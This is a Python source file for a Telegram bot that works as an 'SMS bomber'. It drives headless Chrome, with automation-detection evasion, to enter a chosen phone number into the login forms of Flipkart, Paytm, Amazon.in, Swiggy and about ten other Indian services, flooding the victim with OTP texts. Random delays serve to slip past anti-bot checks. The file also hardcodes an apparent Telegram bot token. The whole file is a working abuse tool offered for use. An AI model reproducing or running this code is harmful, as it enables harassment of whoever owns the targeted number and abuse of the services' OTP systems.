import telebot
import threading
import time
import random
import re
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException, NoSuchElementException
from webdriver_manager.chrome import ChromeDriverManager
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

# अपना BOT TOKEN यहाँ डालो
TOKEN = '7746673219:AAGfbNsG3Ray0lnaLzXlQ-mXQUkESh7Jp5E'
bot = telebot.TeleBot(TOKEN)

# Global
bombing_sessions = {}

# === INDIAN LOGIN PAGES WITH SELECTORS ===
INDIAN_LOGIN_PAGES = [
    # Flipkart
    {'name': 'Flipkart', 'url': 'https://www.flipkart.com/account/login', 'phone': 'input[placeholder="Enter mobile number"]', 'submit': 'button[type="submit"]'},
    
    # Paytm
    {'name': 'Paytm', 'url': 'https://accounts.paytm.com/signin', 'phone': 'input[name="mobile"]', 'submit': 'button[data-qa="sendOtp"]'},
    
    # Amazon.in
    {'name': 'Amazon.in', 'url': 'https://www.amazon.in/ap/signin', 'phone': '#ap_email', 'submit': '#continue'},
    
    # Swiggy
    {'name': 'Swiggy', 'url': 'https://www.swiggy.com/login', 'phone': 'input[placeholder="Enter mobile number"]', 'submit': 'button[type="submit"]'},
    
    # Zomato
    {'name': 'Zomato', 'url': 'https://www.zomato.com/login', 'phone': 'input[name="phone"]', 'submit': 'button[type="submit"]'},
    
    # Ola Cabs
    {'name': 'Ola', 'url': 'https://book.olawebcdn.com/', 'phone': 'input[name="mobile"]', 'submit': 'button[data-qa="sendOtp"]'},
    
    # Uber India
    {'name': 'Uber', 'url': 'https://auth.uber.com/login/', 'phone': 'input[name="phoneNumber"]', 'submit': 'button[type="submit"]'},
    
    # Myntra
    {'name': 'Myntra', 'url': 'https://www.myntra.com/login', 'phone': 'input[name="mobileNumber"]', 'submit': 'button[type="submit"]'},
    
    # BigBasket
    {'name': 'BigBasket', 'url': 'https://www.bigbasket.com/auth/login/', 'phone': 'input[name="mobile"]', 'submit': 'button[type="submit"]'},
    
    # BookMyShow
    {'name': 'BookMyShow', 'url': 'https://in.bookmyshow.com/persona/sign-in', 'phone': 'input[name="mobile"]', 'submit': 'button[type="submit"]'},
    
    # JioMart
    {'name': 'JioMart', 'url': 'https://www.jiomart.com/customer/account/login', 'phone': 'input[name="login[username]"]', 'submit': 'button[type="submit"]'},
    
    # PhonePe
    {'name': 'PhonePe', 'url': 'https://www.phonepe.com/login', 'phone': 'input[name="mobile"]', 'submit': 'button[data-qa="sendOtp"]'},
    
    # Meesho
    {'name': 'Meesho', 'url': 'https://www.meesho.com/login', 'phone': 'input[placeholder="Enter Mobile Number"]', 'submit': 'button[type="submit"]'},
    
    # Groww
    {'name': 'Groww', 'url': 'https://app.groww.in/login', 'phone': 'input[name="mobile"]', 'submit': 'button[type="submit"]'},
]

def setup_driver():
    options = Options()
    options.add_argument('--headless')
    options.add_argument('--no-sandbox')
    options.add_argument('--disable-dev-shm-usage')
    options.add_argument('--disable-blink-features=AutomationControlled')
    options.add_experimental_option("excludeSwitches", ["enable-automation"])
    options.add_experimental_option('useAutomationExtension', False)
    driver = webdriver.Chrome(ChromeDriverManager().install(), options=options)
    driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => false});")
    return driver

def hit_login_page(driver, site, number):
    try:
        driver.get(site['url'])
        wait = WebDriverWait(driver, 12)

        # Wait for phone field
        phone_input = wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, site['phone'])))
        phone_input.clear()
        phone_input.send_keys(number)

        # Click submit
        submit_btn = driver.find_element(By.CSS_SELECTOR, site['submit'])
        driver.execute_script("arguments[0].click();", submit_btn)

        time.sleep(3)
        return True
    except Exception as e:
        print(f"[{site['name']}] Error: {str(e)}")
        return False

def bomb_thread(user_id, number, count):
    session = bombing_sessions[user_id]
    session['sites_hit'] = []
    driver = setup_driver()
    
    try:
        for i in range(count):
            if not session['active']: break
            site = random.choice(INDIAN_LOGIN_PAGES)
            bot.send_message(user_id, f"Bombing **{site['name']}**... ({i+1}/{count})")
            
            if hit_login_page(driver, site, number):
                session['sites_hit'].append(site['name'])
                bot.send_message(user_id, f"{site['name']} → OTP Sent!")
            else:
                bot.send_message(user_id, f"{site['name']} → Failed (CAPTCHA?)")
            
            time.sleep(random.uniform(5, 10))  # Anti-bot delay
        
        driver.quit()
        hit_count = len(session['sites_hit'])
        bot.send_message(user_id, f"*Bombing Complete!*\nSites Hit: {hit_count}\nList: {', '.join(session['sites_hit'])}", parse_mode='Markdown')
    except Exception as e:
        bot.send_message(user_id, f"Error: {str(e)}")
    finally:
        session['active'] = False

# === BOT COMMANDS ===
@bot.message_handler(commands=['start'])
def start(message):
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("Start Bomb", callback_data="help_bomb"))
    bot.send_message(message.chat.id, """
*Indian Login Pages SMS Bomber*

`/bomb 9876543210 5` → 5 sites पर OTP भेजेगा

*15+ Sites*: Flipkart, Paytm, Amazon, Swiggy, Zomato, Ola, Uber, Myntra, etc.

*Warning*: सिर्फ अपना number test करो!
    """, parse_mode='Markdown', reply_markup=markup)

@bot.message_handler(commands=['bomb'])
def bomb_cmd(message):
    try:
        args = message.text.split()
        if len(args) < 3:
            bot.reply_to(message, "Usage: `/bomb 9876543210 5`", parse_mode='Markdown')
            return
        number = re.sub(r'[^\d]', '', args[1])
        count = int(args[2])
        
        if len(number) != 10:
            bot.reply_to(message, "10 digits only!")
            return
        if count > 12:
            bot.reply_to(message, "Max 12 sites!")
            return
        
        user_id = message.from_user.id
        if user_id in bombing_sessions and bombing_sessions[user_id]['active']:
            bot.reply_to(message, "Already running! Use /stop")
            return
        
        bombing_sessions[user_id] = {'active': True, 'number': number, 'count': count, 'sites_hit': []}
        thread = threading.Thread(target=bomb_thread, args=(user_id, number, count))
        thread.start()
        bot.reply_to(message, f"Starting bomb on +91{number} × {count} sites...")
    except:
        bot.reply_to(message, "Invalid input!")

@bot.message_handler(commands=['stop'])
def stop_cmd(message):
    user_id = message.from_user.id
    if user_id in bombing_sessions:
        bombing_sessions[user_id]['active'] = False
        bot.reply_to(message, "Stopped!")
    else:
        bot.reply_to(message, "No active bomb.")

@bot.callback_query_handler(func=lambda call: True)
def callback(call):
    if call.data == "help_bomb":
        bot.answer_callback_query(call.id)
        bot.send_message(call.message.chat.id, "`/bomb 9876543210 5` → Start", parse_mode='Markdown')

# === RUN ===
print("Indian Login Pages Bomber Bot Running...")
bot.infinity_polling()
